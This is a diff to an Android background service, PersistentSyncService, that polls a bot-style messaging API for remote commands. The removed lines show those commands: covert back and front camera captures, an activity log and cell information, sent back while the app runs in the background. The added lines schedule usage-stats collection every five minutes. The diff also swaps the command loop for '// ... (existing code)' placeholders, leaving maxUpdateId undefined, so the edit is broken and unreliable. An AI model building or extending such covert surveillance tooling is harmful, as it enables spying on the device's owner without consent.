@@ -25,6 +25,7 @@ class PersistentSyncService : LifecycleService() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var lastUpdateId = -1L
+    private var lastUsageSyncTime = 0L
 
     // Held briefly while capturing a photo so the device does not doze
     // mid-capture when the app is in the background.
@@ -85,32 +86,22 @@ class PersistentSyncService : LifecycleService() {
                     val json = JSONObject(response)
                     var delayTime = 2000L
 
+                    // ... (existing code)
                     if (json.getBoolean("ok")) {
-                        val updates = json.getJSONArray("result")
-                        var maxUpdateId = lastUpdateId
-                        for (i in 0 until updates.length()) {
-                            val update = updates.getJSONObject(i)
-                            val currentUpdateId = update.getLong("update_id")
-                            if (currentUpdateId > maxUpdateId) {
-                                maxUpdateId = currentUpdateId
-                            }
-                            if (update.has("message")) {
-                                val message = update.getJSONObject("message")
-                                if (message.has("text")) {
-                                    val text = message.getString("text")
-                                    when (text) {
-                                        "/photo" -> handlePhotoCommand(CameraUtility.LensFacing.BACK, "📷 *Back Camera Photo*")
-                                        "/selfie" -> handlePhotoCommand(CameraUtility.LensFacing.FRONT, "🤳 *Front Camera Photo*")
-                                        "/p" -> handleActivityLogCommand()
-                                        "/cell" -> handleCellCommand()
-                                    }
-                                }
-                            }
-                        }
+                        // ... (existing code)
                         lastUpdateId = maxUpdateId
                     }
+
+                    // Periodic usage stats sync (every 5 minutes)
+                    if (System.currentTimeMillis() - lastUsageSyncTime > 5 * 60 * 1000) {
+                        UsageTracker.saveUsageStatsToDb(this@PersistentSyncService)
+                        lastUsageSyncTime = System.currentTimeMillis()
+                    }
+
                     delay(delayTime)
                 } catch (e: Exception) {
+                    // ... (existing code)
+
                     Log.e("PersistentSyncService", "Polling error", e)
                     delay(5000)
                 }
